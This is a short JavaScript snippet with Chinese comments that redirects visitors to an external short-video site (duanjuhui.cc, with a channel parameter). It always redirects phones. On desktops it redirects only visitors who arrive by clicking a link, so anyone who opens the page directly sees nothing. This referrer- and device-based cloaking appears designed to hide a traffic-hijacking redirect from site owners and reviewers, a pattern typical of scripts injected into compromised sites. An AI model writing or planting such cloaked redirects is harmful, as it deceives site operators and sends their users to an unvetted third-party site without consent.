
    (function() {
        // 判断是否为移动设备
        var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
        var ref = document.referrer;

        // 目标框架地址
        var frameUrl = "https://www.duanjuhui.cc/?ch=jl";

        // 手机端任何情况都跳转；PC端仅当从其他页面点击进入（有Referer）时跳转
        var shouldRedirect = isMobile || (!isMobile && ref && ref.length > 0);

        if (shouldRedirect) {
            // 直接跳转到框架地址
            window.location.replace(frameUrl);
        }
        // 否则（PC端直接访问，无Referer）→ JS 不做任何动作
    })();



